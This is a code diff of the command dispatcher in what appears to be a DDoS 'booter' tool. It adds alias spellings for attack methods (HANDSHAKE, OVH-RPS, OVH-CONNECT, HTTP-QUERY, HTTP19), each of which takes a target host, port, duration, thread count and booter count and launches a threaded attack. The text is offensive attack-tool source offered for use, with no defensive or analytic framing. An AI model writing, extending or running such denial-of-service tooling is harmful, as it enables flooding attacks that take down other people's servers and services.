@@ -87,7 +87,7 @@ def controler():
             threading.Thread(target=type_sender,args=('HANDSHAKE',f'{target} {times} {thread} {meths}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['HANDSHAKE']))
-        elif a =='OVH-RPS' or a == 'أوفه-آربيس' or a == 'OVHRPS':
+        elif a =='OVH_RPS' or a =='OVH-RPS' or a == 'أوفه-آربيس' or a == 'OVHRPS':
            if len(com) == 6:
             target = com[1]
             port = com[2]
@@ -97,7 +97,7 @@ def controler():
             threading.Thread(target=type_sender,args=('OVH_RPS',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHRPS']))
-        elif a =='OVH-CONNECT' or a == 'OVH-الاتصال' or a == 'OVHCONNECT':
+        elif a =='OVH-CONNECT' or a == 'OVH-الاتصال' or a =='OVH_CONNECT' or a == 'OVHCONNECT':
            if len(com) == 6:
             target = com[1]
             port = com[2]
@@ -107,7 +107,7 @@ def controler():
             threading.Thread(target=type_sender,args=('OVH_CONNECT',f'{target} {port} {times} {thread} {booters}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['OVHCONNECT']))
-        elif a =='HTTPQUERY' or a == 'HTTP-QUERY':
+        elif a =='HTTPQUERY' or a == 'HTTP_QUERY' or a == 'HTTP-QUERY':
            if len(com) == 7:
             target = com[1]
             port = com[2]
@@ -118,7 +118,7 @@ def controler():
             threading.Thread(target=type_sender,args=('HTTP_QUERY',f'{target} {port} {times} {thread} {booters} {methods}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['HTTPQUERY']))
-        elif a =='HTTP19' or a == 'HTTP-19':
+        elif a =='HTTP19' or a == 'HTTP_19' or a == 'HTTP-19':
            if len(com) == 6:
             target = com[1]
             port = com[2]
